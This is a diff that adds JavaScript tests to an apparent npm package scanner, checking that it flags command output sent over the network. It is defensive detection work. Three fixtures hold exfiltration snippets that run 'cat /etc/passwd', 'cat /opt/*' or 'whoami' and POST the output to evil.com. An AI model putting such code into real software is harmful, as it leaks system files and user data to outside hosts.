@@ -296,6 +296,72 @@ req.end();
       assertIncludes(t.message, 'https.request', 'Message should include https.request');
     } finally { cleanupTemp(tmp); }
   });
+
+  // --- Exec result exfiltration tests ---
+
+  await asyncTest('EXEC-EXFIL: execSync result → https.request (elf-stats pattern)', async () => {
+    const code = `const { execSync } = require('child_process');
+const https = require('https');
+const output = execSync('cat /opt/*', { encoding: 'utf-8' });
+const postData = JSON.stringify({ output: output });
+const options = { hostname: 'evil.com', method: 'POST' };
+https.request(options).write(postData);`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect execSync result exfiltration');
+      assert(t.taint_tracked === true, 'Should have taint_tracked flag');
+      assertIncludes(t.message, 'child_process.execSync', 'Message should include child_process.execSync');
+      assertIncludes(t.message, 'command output', 'Message should say command output');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('EXEC-EXFIL: exec callback stdout → network send', async () => {
+    const code = `const { exec } = require('child_process');
+const https = require('https');
+exec('whoami', (err, stdout) => {
+  const options = { hostname: 'evil.com', method: 'POST' };
+  const req = https.request(options);
+  req.write(stdout);
+  req.end();
+});`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect exec callback stdout exfiltration');
+      assert(t.taint_tracked === true, 'Should have taint_tracked flag');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('EXEC-EXFIL: execSync result → JSON.stringify → network send', async () => {
+    const code = `const { execSync } = require('child_process');
+const https = require('https');
+const result = execSync('cat /etc/passwd', { encoding: 'utf-8' });
+const data = JSON.stringify({ r: result });
+const req = https.request({ hostname: 'evil.com', method: 'POST' });
+req.write(data);
+req.end();`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(t, 'Should detect execSync result through JSON.stringify to network');
+    } finally { cleanupTemp(tmp); }
+  });
+
+  await asyncTest('EXEC-EXFIL: execSync without network send does NOT trigger', async () => {
+    const code = `const { execSync } = require('child_process');
+const output = execSync('npm install', { encoding: 'utf-8' });
+console.log(output);`;
+    const tmp = makeTempPkg(code);
+    try {
+      const result = await runScanDirect(tmp);
+      const t = result.threats.find(t => t.type === 'suspicious_dataflow');
+      assert(!t, 'Should NOT detect suspicious_dataflow for exec without network send');
+    } finally { cleanupTemp(tmp); }
+  });
 }
 
 module.exports = { runDataflowTests };
